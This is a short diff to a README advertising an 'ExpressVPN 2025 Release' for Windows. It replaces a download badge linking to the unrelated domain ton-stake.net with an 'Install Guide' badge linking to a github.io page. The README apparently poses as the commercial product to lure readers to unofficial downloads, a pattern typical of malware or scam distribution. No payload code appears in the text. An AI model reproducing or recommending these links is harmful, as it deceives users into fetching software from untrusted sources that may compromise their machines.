@@ -3,7 +3,10 @@
 **ExpressVPN 2025 Release** is the secure VPN client for Windows PCs.  
 It provides unlimited servers, fast connection speeds, and advanced privacy tools for streaming and browsing in 2025.
 
-[![Download ExpressVPN](https://img.shields.io/badge/Download-ExpressVPN_2025-blueviolet)](https://ton-stake.net)
+<a href="https://expressvpn-2025-release.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
